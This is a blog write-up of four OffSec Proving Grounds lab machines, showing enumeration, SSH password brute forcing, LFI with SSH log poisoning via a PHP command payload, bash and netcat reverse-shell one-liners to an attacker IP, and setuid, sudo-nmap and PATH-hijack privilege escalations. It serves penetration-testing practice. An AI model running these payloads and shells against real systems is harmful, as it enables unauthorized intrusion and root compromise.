<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness" /><meta property="og:locale" content="en" /><meta name="description" content="Gaara" /><meta property="og:description" content="Gaara" /><link rel="canonical" href="https://tanishq.page/blog/posts/oscp-pg-set3/" /><meta property="og:url" content="https://tanishq.page/blog/posts/oscp-pg-set3/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta property="og:image:alt" content="PG Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-19T02:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta name="twitter:image:alt" content="PG Artwork" /><meta property="twitter:title" content="OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-19T02:00:00-05:00","datePublished":"2021-12-19T02:00:00-05:00","description":"Gaara","headline":"OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness","image":{"alt":"PG Artwork","url":"https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/oscp-pg-set3/"},"url":"https://tanishq.page/blog/posts/oscp-pg-set3/"}</script><title>OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { let self = this;this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { self.clearMode(); } self.notify(); }); if (!this.hasMode) { return; } if (this.isDarkMode) { this.setDark(); } else { this.setLight(); } } get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isPreferDark() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }get modeStatus() { if (this.hasMode) { return this.mode; } else { return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); }notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { this.clearMode(); } else { if (this.isPreferDark) { this.setLight(); } else { this.setDark(); } } this.notify(); } } const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/blog/">Tanishq Rupaal</a></h1><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1639897200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 19, 2021 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/pg-cover.jpeg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/pg-cover.jpeg" alt="PG Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">PG Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1351 words" > <em>7 min</em> read</span></div></div></div></header><div class="content"><h2 id="gaara"><span class="me-2">Gaara</span><a href="#gaara" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.208.142</code></p><h4 id="network-scan"><span class="me-2">Network Scan</span><a href="#network-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 ((Debian))</table></div><h4 id="web-scan"><span class="me-2">Web Scan</span><a href="#web-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.208.142 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php</code></p><p>This did not reveal any useful information.</p><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using the image on the webpage as a reference, the username could be <code class="language-plaintext highlighter-rouge">gaara</code>. Therefore, used hydra to brute force the ssh server against the rockyou password list.</p><pre><code class="language-other">hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.208.142:22
</code></pre><p>This gives the password as <code class="language-plaintext highlighter-rouge">iloveyou2</code> and subsequently gets the user flag.</p><h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Checking for setuid binaries reveals the presence of <code class="language-plaintext highlighter-rouge">gdb</code> as a setuid to root executable. The user is not present in the sudoers file. Therefore, it is essential to escalate using the <code class="language-plaintext highlighter-rouge">gdb</code> binary.</p><p>This is done as follows → <code class="language-plaintext highlighter-rouge">gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit</code>.</p><p>This grants the root shell and subsequently the root flag.</p><hr /><h2 id="geisha"><span class="me-2">Geisha</span><a href="#geisha" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-1"><span class="me-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.56.82</code></p><h4 id="network-scan-1"><span class="me-2">Network Scan</span><a href="#network-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -sC -A -Pn -p- -o nmap.txt 192.168.56.82</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>21<td>FTP<td>vsftpd 3.0.3<tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 ((Debian))<tr><td>7080<td>HTTPS<td>ssl/empowerid LiteSpeed<tr><td>7125<td>HTTP<td>nginx 1.17.10<tr><td>8088<td>HTTP<td>LiteSpeed httpd<tr><td>9198<td>HTTP<td>SimpleHTTPServer 0.6 (Python 2.7.16)</table></div><h4 id="web-scan-1"><span class="me-2">Web Scan</span><a href="#web-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.56.82:&lt;ports&gt; -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php</code></p><p>Directories/files listed →</p><p>Port 8088 →</p><ul><li>cgi-bin/ (404)<li>docs/<li>blocked/ (403)</ul><p>Port 7125 →</p><ul><li>shadow (403)<li>passwd</ul><p>The passwd file lists user <code class="language-plaintext highlighter-rouge">geisha</code>.</p><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With the username as <code class="language-plaintext highlighter-rouge">geisha</code>, a brute force was launched on the ssh server using hydra as follows → <code class="language-plaintext highlighter-rouge">hydra -l geisha -P /home/tanq/installations/SecLists/rockyou.txt ssh://192.168.56.82</code>.</p><p>This gives the password as <code class="language-plaintext highlighter-rouge">letmein</code>. After a successful login, the user flag can be obtained.</p><h3 id="privilege-escalation-1"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using the user shell, enumerated for setuid binaries as follows → <code class="language-plaintext highlighter-rouge">find / -perm -u=s 2&gt;/dev/null</code>.</p><p>This resulted in an interesting find for the binary <code class="language-plaintext highlighter-rouge">/usr/bin/base32</code>. This could be used to read files with a privileged access, thereby allowing reads of files owned by root. Therefore, it was used to read the root flag as follows →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>file=/root/proof.txt
/usr/bin/base32 "$file" | /usr/bin/base32 --decode
</pre></table></code></div></div><p>This can also be used to obtain root shell by using it to leak the ssh key of root and then using it to log in to the machine via ssh.</p><p>This gave the root flag.</p><hr /><h2 id="ha-natraj"><span class="me-2">Ha-Natraj</span><a href="#ha-natraj" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-2"><span class="me-2">Enumeration</span><a href="#enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.51.80</code></p><h4 id="network-scan-2"><span class="me-2">Network Scan</span><a href="#network-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.80</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><h4 id="table"><span class="me-2">Table</span><a href="#table" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.29 (Ubuntu)</table></div><h4 id="web-scan-2"><span class="me-2">Web Scan</span><a href="#web-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.51.80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php</code></p><p>Directories/files listed →</p><ul><li>images/<li>index.html<li>console/</ul><p>The <code class="language-plaintext highlighter-rouge">console/</code> directory has a php file present in it called <code class="language-plaintext highlighter-rouge">file.php</code>.</p><h3 id="exploitation-2"><span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="lfi"><span class="me-2">LFI</span><a href="#lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Running the <code class="language-plaintext highlighter-rouge">file.php</code> file does not give any output. As a good practice checking for LFI using <code class="language-plaintext highlighter-rouge">?file=../../../../../etc/passwd</code> works out and LFI is possible. There is an ssh service on the machine, therefore, checked log files. The auth log file at <code class="language-plaintext highlighter-rouge">/var/log/auth.log</code> contains the ssh logs.</p><h4 id="transition-lfi-to-ssh-log-poisoning"><span class="me-2">Transition LFI to SSH Log Poisoning</span><a href="#transition-lfi-to-ssh-log-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Given the presence of SSH logs, poisoning is tested by using payload → <code class="language-plaintext highlighter-rouge">ssh "&lt;?php system(\$_GET['cmd']);?&gt;"@&lt;192.168.125.80&gt;</code>. A failed login attempt gets logged and the php code is inserted. LFI can now be used to execute the php in the log file, with the addition of the <code class="language-plaintext highlighter-rouge">cmd</code> parameter like so → <code class="language-plaintext highlighter-rouge">..console/file.php?file=/var/log/auth.log&amp;cmd=id</code>. This returned the id of the <code class="language-plaintext highlighter-rouge">www-data</code> user in the response i.e., RCE.</p><h4 id="user-shell"><span class="me-2">User shell</span><a href="#user-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Using the RCE, a shell can be spawned by using bash payload → <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/192.168.49.208/3002 0&gt;&amp;1</code> to get a reverse shell. This can be done via burp to URL encode and send the payload. There was no bash in the system, therefore reverting to nc and /bin/sh combo → <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.208 3002 &gt;/tmp/f</code>.</p><p>This gives a <code class="language-plaintext highlighter-rouge">www-data</code> user shell via netcat.</p><h3 id="privilege-escalation-2"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="escalated-user"><span class="me-2">Escalated User</span><a href="#escalated-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>With the <code class="language-plaintext highlighter-rouge">www-data</code> shell, the linenum script can be run (example → <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">linenum script</a>). This gives the files which are writable by the current user. One such file is the <code class="language-plaintext highlighter-rouge">apache2.conf</code> file which can be modified to ensure execution of the web server as a privileged user by editing the User and Group to be <code class="language-plaintext highlighter-rouge">mahakal</code>, a user detected by looking at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p><p>Next, a pentest monkey php reverse shell is plugged into the serving directory for navigation to it. This can be named <code class="language-plaintext highlighter-rouge">exploit.php</code>. The server needs to be restarted for the new settings to be applied. Therefore, as revealed using <code class="language-plaintext highlighter-rouge">sudo -l</code>, the server can be restarted as super user without the need of a password using the systemctl command as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</p><p>After it is restarted, a listener can be used to receive shell as the user <code class="language-plaintext highlighter-rouge">mahakal</code>.</p><h4 id="root"><span class="me-2">Root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>As the user <code class="language-plaintext highlighter-rouge">mahakal</code>, the binary that can be run as as a super user without a password as revealed by <code class="language-plaintext highlighter-rouge">sudo -l</code> is actually <code class="language-plaintext highlighter-rouge">nmap</code>.</p><p>Nmap can be used to launch an interactive interpreter using →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>TF=$(mktemp)
echo 'os.execute("/bin/sh")' &gt; $TF
nmap --script=$TF
</pre></table></code></div></div><p>Thus, the shell received is actually that of root. This gives the root flag.</p><hr /><h2 id="inclusiveness"><span class="me-2">Inclusiveness</span><a href="#inclusiveness" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-3"><span class="me-2">Enumeration</span><a href="#enumeration-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.80.14</code></p><h4 id="network-scan-3"><span class="me-2">Network Scan</span><a href="#network-scan-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.14</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>21<td>FTP<td>vsftpd 3.0.3 → <em>Anonymous FTP allowed</em><tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 ((Debian))</table></div><h4 id="web-scan-3"><span class="me-2">Web Scan</span><a href="#web-scan-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.80.14 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.html<li>robots.txt<li>seo.html<li>javascript/<li>manual/</ul><p>Looking at the robots.txt, it says only search engines are allowed to access it. Therefore, changing the User-Agent to <code class="language-plaintext highlighter-rouge">GoogleBot</code> in burp allows bypassing this restriction. This gives the directory <code class="language-plaintext highlighter-rouge">/secret_information/</code>.</p><h3 id="exploitation-3"><span class="me-2">Exploitation</span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="lfi-1"><span class="me-2">LFI</span><a href="#lfi-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The <code class="language-plaintext highlighter-rouge">/secret_information/</code> directory consists of an introduction to DNS Zone transfer attacks and links to display it in English or Spanish. The links are of the form <code class="language-plaintext highlighter-rouge">..?lang=language.php</code>. Therefore, attempting LFI here allows to print contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. This gives enumeration of the users → <code class="language-plaintext highlighter-rouge">tom</code> and <code class="language-plaintext highlighter-rouge">root</code>.</p><p>The anonymous ftp login shows that the <code class="language-plaintext highlighter-rouge">pub</code> directory of the FTP service is world writeable. Therefore, it is a good place for landing payloads. To get the exact path of the location, the configuration file must be read. From the service enumeration, the version is known to be vsftpd 3.0.3. The default config for this is at <code class="language-plaintext highlighter-rouge">/etc/vsftpd.conf</code>.</p><p>Using LFI to print this shows the following →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>anon_root=/var/ftp/
write_enable=YES
</pre></table></code></div></div><h4 id="reverse-shell-from-anonymous-write-enabled-ftp-and-lfi"><span class="me-2">Reverse shell from Anonymous write-enabled FTP and LFI</span><a href="#reverse-shell-from-anonymous-write-enabled-ftp-and-lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Using the FTP to upload a reverse shell in PHP and then using LFI to navigate to the payload using the path found in the config file grants the shell as user <code class="language-plaintext highlighter-rouge">www-data</code>. The payload used is pentest monkey’s PHP reverse shell.</p><p>Enumerating the setuid binaries, an interesting find was the presence of <code class="language-plaintext highlighter-rouge">/home/tom/rootshell</code>, which indicates getting privilege of user <code class="language-plaintext highlighter-rouge">tom</code> is the step required to get root on the machine.</p><h3 id="privilege-escalation-3"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="user"><span class="me-2">User</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The home directory of the user <code class="language-plaintext highlighter-rouge">tom</code> is readable by <code class="language-plaintext highlighter-rouge">www-data</code>. Therefore, visiting it grants access to the code of the rootshell binary found above. This also gives the user flag.</p><p>The code of the rootshell binary uses <code class="language-plaintext highlighter-rouge">FILE* f = popen("whoami", "r");</code>. This does not use an exact path, therefore, the PATH variable can be abused to trick the program into evaluating the username as <code class="language-plaintext highlighter-rouge">tom</code>. Therefore, creating a new directory in <code class="language-plaintext highlighter-rouge">/tmp</code> and an executable <code class="language-plaintext highlighter-rouge">whoami</code> under it that prints tom allows adding this to the current PATH.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>echo '#!/bin/bash' &gt; whoami
echo 'echo tom' &gt;&gt; whoami
chmod +x whoami
export PATH=/tmp/testdirectory
</pre></table></code></div></div><p>This allows for execution of the rootshell binary, which evaluates all checks to true and grants the root shell, thereby the root flag.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/offsec-proving-grounds/">OffSec Proving Grounds</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/offsec-proving-grounds/" class="post-tag no-text-decoration" >offsec-proving-grounds</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OffSec%20PG%20-%20Gaara,%20Geisha,%20Ha-Natraj,%20Inclusiveness%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OffSec%20PG%20-%20Gaara,%20Geisha,%20Ha-Natraj,%20Inclusiveness%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set3%2F&text=OffSec%20PG%20-%20Gaara,%20Geisha,%20Ha-Natraj,%20Inclusiveness%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-leantime/">Leantime in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/gha-docker-arch/">GitHub Actions & ARM Architecture</a><li class="text-truncate lh-lg"> <a href="/blog/posts/dbs-zamasu-timeline/">Dragon Ball Super - Zamasu Timeline 101</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-wallabag/">Wallabag in Home Lab</a><li class="text-truncate lh-lg"> <a 